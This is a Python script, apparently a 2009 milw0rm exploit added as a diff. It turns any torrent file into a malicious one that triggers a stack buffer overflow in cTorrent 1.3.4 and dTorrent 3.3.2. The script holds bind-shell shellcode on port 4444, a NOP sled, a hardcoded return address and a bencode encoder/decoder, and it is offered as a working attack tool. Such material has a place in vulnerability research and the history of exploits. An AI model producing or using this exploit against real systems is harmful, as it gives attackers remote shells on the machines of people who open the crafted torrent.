@@ -1,0 +1,215 @@
+#!/usr/bin/python
+
+#Written By Michael Brooks
+#04/17/2009
+
+#Stack Based Buffer Overflow 
+#The vulnerability is in the btFiles::BuildFromMI function 
+#inside the btfiles.cpp file
+
+#Exploit tested on cTorrent 1.3.4 using Debian Sarge using Linux kernel 2.4.27-3-386
+#Can't get the exploit working on a modern linux kernel because of ASLR
+
+#code is using python 2.5
+
+#Home page for cTorrent 1.3.4:
+#http://sourceforge.net/projects/ctorrent/  161,000+ Downloads
+#dTorrent 3.3.2 is also vulnerable: 
+#http://sourceforge.net/projects/dtorrent/ 18,000+ downloads
+
+import sys
+import os
+#This code will take any torrent file and turn it into an exploit. 
+USAGE="python exploit.py in_file.torrent out_file.torrent"
+
+def main():
+    #Start of the program
+    bfile=fileio()
+    try:
+        bad_torrent=bfile.read_bencode(sys.argv[1])
+    except:
+        print USAGE
+        sys.exit()
+    
+    exploit_str=create_exploit()
+    print("Writing Bytes:"+str(len(exploit_str)))
+    bad_torrent["info"]["files"][0]["path"][0]=exploit_str
+    try:
+        bfile.write_bencode(sys.argv[2], bad_torrent)
+    except:
+        print USAGE
+        sys.exit()
+
+def create_exploit():
+    # linux_ia32_bind -  LPORT=4444 Size=108 Encoder=PexFnstenvSub http://metasploit.com
+    shellcode  = "\x2b\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x27"
+    shellcode += "\x1a\xbe\x4e\x83\xeb\xfc\xe2\xf4\x16\xc1\xed\x0d\x74\x70\xbc\x24"
+    shellcode += "\x41\x42\x27\xc7\xc6\xd7\x3e\xd8\x64\x48\xd8\x26\x36\x46\xd8\x1d"
+    shellcode += "\xae\xfb\xd4\x28\x7f\x4a\xef\x18\xae\xfb\x73\xce\x97\x7c\x6f\xad"
+    shellcode += "\xea\x9a\xec\x1c\x71\x59\x37\xaf\x97\x7c\x73\xce\xb4\x70\xbc\x17"
+    shellcode += "\x97\x25\x73\xce\x6e\x63\x47\xfe\x2c\x48\xd6\x61\x08\x69\xd6\x26"
+    shellcode += "\x08\x78\xd7\x20\xae\xf9\xec\x1d\xae\xfb\x73\xce"
+    
+    #The exact address of our buffer is 0xbffffccc, which ebx tells us
+    #however memeory changes before we control the eip,  
+    #so we change the addr to hit the NOP sled
+    eip="\x11\xf1\xff\xbf"
+    #eip="\xcc\xfc\xff\xbf"#the add ebx is holding
+    
+    #this is a dummy address to satisfy other pointer before we return
+    #this cannot be the EIP becuase this location is written to!
+    dumb_addr="\xcc\xfc\xff\xbf"
+    
+    #nop sled
+    long_str="\x90"*(4028-len(shellcode))
+    #memory around the shellcode is written to,  but this is a safe place
+    long_str+=shellcode
+    #this 100byte buffer is written to before we control the eip
+    long_str+="\x90"*100
+    long_str+=eip#4128 bytes is the EIP!
+    
+    #This pointer must be real becuase it is written to in btFiles::BuildFromMI
+    long_str+=dumb_addr#"this" 
+    #We can control these addresses but we don't need them
+    #long_str+=dumb_addr#"metabuf"
+    #long_str+=dumb_addr#"saveas"
+    return long_str
+        
+#Start of functions for bencoding:
+def BTFailure(msg):
+    pass
+
+def decode_int(x, f):
+    f += 1
+    newf = x.index('e', f)
+    n = int(x[f:newf])
+    if x[f] == '-':
+        if x[f + 1] == '0':
+            raise ValueError
+    elif x[f] == '0' and newf != f+1:
+        raise ValueError
+    return (n, newf+1)
+
+def decode_string(x, f):
+    colon = x.index(':', f)
+    n = int(x[f:colon])
+    if x[f] == '0' and colon != f+1:
+        raise ValueError
+    colon += 1
+    return (x[colon:colon+n], colon+n)
+
+def decode_list(x, f):
+    r, f = [], f+1
+    while x[f] != 'e':
+        v, f = decode_func[x[f]](x, f)
+        r.append(v)
+    return (r, f + 1)
+
+def decode_dict(x, f):
+    r, f = {}, f+1
+    while x[f] != 'e':
+        k, f = decode_string(x, f)
+        r[k], f = decode_func[x[f]](x, f)
+    return (r, f + 1)
+
+decode_func = {}
+decode_func['l'] = decode_list
+decode_func['d'] = decode_dict
+decode_func['i'] = decode_int
+decode_func['0'] = decode_string
+decode_func['1'] = decode_string
+decode_func['2'] = decode_string
+decode_func['3'] = decode_string
+decode_func['4'] = decode_string
+decode_func['5'] = decode_string
+decode_func['6'] = decode_string
+decode_func['7'] = decode_string
+decode_func['8'] = decode_string
+decode_func['9'] = decode_string
+
+def bdecode(x):
+    try:
+        r, l = decode_func[x[0]](x, 0)
+    except (IndexError, KeyError, ValueError):
+        raise BTFailure("not a valid bencoded string")
+    if l != len(x):
+        raise BTFailure("invalid bencoded value (data after valid prefix)")
+    return r
+
+from types import StringType, IntType, LongType, DictType, ListType, TupleType
+
+
+class Bencached(object):
+
+    __slots__ = ['bencoded']
+
+    def __init__(self, s):
+        self.bencoded = s
+
+def encode_bencached(x,r):
+    r.append(x.bencoded)
+
+def encode_int(x, r):
+    r.extend(('i', str(x), 'e'))
+
+def encode_bool(x, r):
+    if x:
+        encode_int(1, r)
+    else:
+        encode_int(0, r)
+        
+def encode_string(x, r):
+    r.extend((str(len(x)), ':', x))
+
+def encode_list(x, r):
+    r.append('l')
+    for i in x:
+        encode_func[type(i)](i, r)
+    r.append('e')
+
+def encode_dict(x,r):
+    r.append('d')
+    ilist = x.items()
+    ilist.sort()
+    for k, v in ilist:
+        r.extend((str(len(k)), ':', k))
+        encode_func[type(v)](v, r)
+    r.append('e')
+
+encode_func = {}
+encode_func[Bencached] = encode_bencached
+encode_func[IntType] = encode_int
+encode_func[LongType] = encode_int
+encode_func[StringType] = encode_string
+encode_func[ListType] = encode_list
+encode_func[TupleType] = encode_list
+encode_func[DictType] = encode_dict
+
+try:
+    from types import BooleanType
+    encode_func[BooleanType] = encode_bool
+except ImportError:
+    pass
+
+def bencode(x):
+    r = []
+    encode_func[type(x)](x, r)
+    return ''.join(r)
+
+class fileio:
+    def read_bencode(self,file):
+        infile = open(file,"r")
+        file=infile.read()
+        infile.close
+        return bdecode(file)
+    
+    #writes a dictionary to a bencoded file
+    def write_bencode(self,file,dict):
+        outfile = open(file, 'wb')
+        outfile.write(bencode(dict))
+        outfile.close()    
+    
+#execute main
+main()
+
+# milw0rm.com [2009-04-17]
